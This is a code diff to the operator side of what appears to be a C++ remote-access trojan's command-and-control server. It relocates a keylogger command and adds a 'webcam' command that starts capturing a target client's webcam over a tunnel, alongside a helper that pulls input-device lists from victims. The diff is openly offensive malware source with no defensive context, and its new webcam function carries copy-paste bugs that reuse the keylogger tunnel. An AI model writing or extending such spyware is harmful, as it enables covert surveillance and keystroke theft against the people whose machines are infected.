@@ -117,13 +117,6 @@ CommandHandler::CommandHandler(
         this,
         {HELP_ARG}
     ));
-    command_map_.emplace("keylogger", Command(
-        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index> -d <device number for eventX>\nBy default \"us\" layout is used. To change it specify it with -l/--layout argument. eg -l us \nUse -rm to remove the keylogger from the client",
-        &CommandHandler::keylogger,
-        this,
-        {HELP_ARG, REMOVE_ARG, DEVICE_ARG, KB_LAYOUT_ARG},
-        {INDEX_ARG}
-    ));
     command_map_.emplace("kill", Command(
         "Kill the selected client. Usage: kill -i <client_index> / kill -a to kill all clients",
         &CommandHandler::kill,
@@ -144,6 +137,20 @@ CommandHandler::CommandHandler(
         this,
         {HELP_ARG},
         {INDEX_ARG, OUT_ARG}
+    ));
+    command_map_.emplace("keylogger", Command(
+        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index> -d <device number for eventX>\nBy default \"us\" layout is used. To change it specify it with -l/--layout argument. eg -l us \nUse -rm to remove the keylogger from the client",
+        &CommandHandler::keylogger,
+        this,
+        {HELP_ARG, REMOVE_ARG, DEVICE_ARG, KB_LAYOUT_ARG},
+        {INDEX_ARG}
+    ));
+    command_map_.emplace("webcam", Command(
+        "Start capturing target's webcam. Usage: webcam -i <client_index>. Optional -d <device number for /dev/videoX> (default = 0),  -o <output_file>",
+        &CommandHandler::webcam_recorder,
+        this,
+        {HELP_ARG, REMOVE_ARG, DEVICE_ARG, OUT_ARG},
+        {INDEX_ARG}
     ));
 }
 
@@ -403,52 +410,6 @@ void CommandHandler::kill() {
     }
 }
 
-void CommandHandler::keylogger() {
-    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
-
-    Tunnel* p_tunnel = get_tunnel(client_index, KEYLOGGER);
-
-    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
-        if (p_tunnel != nullptr) {
-            uint64_t u = 1;
-            write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
-            send_client(KEYLOGGER, 0, client_index);
-            *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::keylogger] Keylogger removed from client " << client_index << RESET_C2_FIFO;
-        } else {
-            *p_event_log_ << LOG_MUST << RED << "CommandHandler::keylogger] Keylogger is not active for client " << client_index << RESET_C2_FIFO; 
-        }
-    } else {
-        if (p_tunnel == nullptr) {
-            if (arg_map_.find(DEVICE_ARG) == arg_map_.end()) {
-                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Specify the target device name using -d/--dev.  You can get a list of devices using the get-dev -o <output file> command" << RESET_C2_FIFO;
-                return;
-            }
-
-            std::string layout = "us";
-            if (arg_map_.find(KB_LAYOUT_ARG) != arg_map_.end()) {
-                layout = std::any_cast<std::string>(arg_map_[KB_LAYOUT_ARG]);
-            }
-
-            Keylogger* keylogger = new Keylogger();
-            keylogger->set_dev(std::any_cast<int>(arg_map_[DEVICE_ARG]));
-            keylogger->set_layout(layout);
-            Tunnel* tunnel = new Tunnel(client_index, KEYLOGGER, keylogger);
-            {
-                std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
-                p_tunnels_->emplace_back(tunnel);
-            }
-            try {
-                std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
-            } catch (const std::system_error& e) {
-                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Error creating thread for keylogger" << RESET_C2_FIFO;
-                erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
-            }
-        } else {
-            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Keylogger is already active for client " << client_index << RESET_C2_FIFO;
-        }
-    }
-}
-
 void CommandHandler::get_file() {
     int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
     std::string file_name = std::any_cast<std::string>(arg_map_[FILE_NAME_ARG]);
@@ -477,6 +438,100 @@ void CommandHandler::get_dev() {
     // Receive the /proc/bus/input/devices file from the client
     arg_map_[FILE_NAME_ARG] =  "/proc/bus/input/devices";
     get_file();
+}
+
+void CommandHandler::keylogger() {
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+
+    Tunnel* p_tunnel = get_tunnel(client_index, KEYLOGGER);
+
+    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
+        if (p_tunnel != nullptr) {
+            uint64_t u = 1;
+            write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
+            send_client(KEYLOGGER, 0, client_index);
+            *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::keylogger] Keylogger removed from client " << client_index << RESET_C2_FIFO;
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "CommandHandler::keylogger] Keylogger is not active for client " << client_index << RESET_C2_FIFO; 
+        }
+    } else {
+        if (p_tunnel == nullptr) {
+            if (arg_map_.find(DEVICE_ARG) == arg_map_.end()) {
+                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Specify the target device name using -d/--dev.  You can get a list of devices using the get-dev -o <output file> command" << RESET_C2_FIFO;
+                return;
+            }
+
+            std::string layout = "us";
+            if (arg_map_.find(KB_LAYOUT_ARG) != arg_map_.end()) {
+                layout = std::any_cast<std::string>(arg_map_[KB_LAYOUT_ARG]);
+            }
+
+            Keylogger* p_keylogger = new Keylogger();
+            p_keylogger->set_dev(std::any_cast<int>(arg_map_[DEVICE_ARG]));
+            p_keylogger->set_layout(layout);
+            Tunnel* tunnel = new Tunnel(client_index, KEYLOGGER, p_keylogger);
+            {
+                std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
+                p_tunnels_->emplace_back(tunnel);
+            }
+            try {
+                std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
+            } catch (const std::system_error& e) {
+                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Error creating thread for keylogger" << RESET_C2_FIFO;
+                erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
+            }
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Keylogger is already active for client " << client_index << RESET_C2_FIFO;
+        }
+    }
+}
+
+void CommandHandler::webcam_recorder() {
+    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
+
+    Tunnel* p_tunnel = get_tunnel(client_index, KEYLOGGER);
+
+    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
+        if (p_tunnel != nullptr) {
+            uint64_t u = 1;
+            write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
+            send_client(KEYLOGGER, 0, client_index);
+            *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::webcam_recorder] Webcam Recorder removed from client " << client_index << RESET_C2_FIFO;
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "CommandHandler::webcam_recorder] Webcam Recorder is not active for client " << client_index << RESET_C2_FIFO; 
+        }
+    } else {
+        if (p_tunnel == nullptr) {
+            int device_num = 0;
+            if (arg_map_.find(DEVICE_ARG) != arg_map_.end()) {
+                device_num = std::any_cast<int>(arg_map_[DEVICE_ARG]);
+            }
+
+            std::string out_name = "";
+            if (arg_map_.find(OUT_ARG) != arg_map_.end()) {
+                out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);
+            }
+
+            WebcamRecorder* p_webcam_recorder = new WebcamRecorder();
+            p_webcam_recorder->set_dev(device_num);
+            if (!out_name.empty()) {
+                p_webcam_recorder->set_out(out_name);
+            }
+            Tunnel* tunnel = new Tunnel(client_index, WEBCAM_RECORDER, p_webcam_recorder);
+            {
+                std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
+                p_tunnels_->emplace_back(tunnel);
+            }
+            try {
+                std::thread(&CommandHandler::handle_tunnelt, this, tunnel, UDP_BASED).detach();
+            } catch (const std::system_error& e) {
+                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Error creating thread for webcam_recorder" << RESET_C2_FIFO;
+                erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
+            }
+        } else {
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Webcam Recorder is already active for client " << client_index << RESET_C2_FIFO;
+        }
+    }
 }
 
 void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel, int __connection_type) {
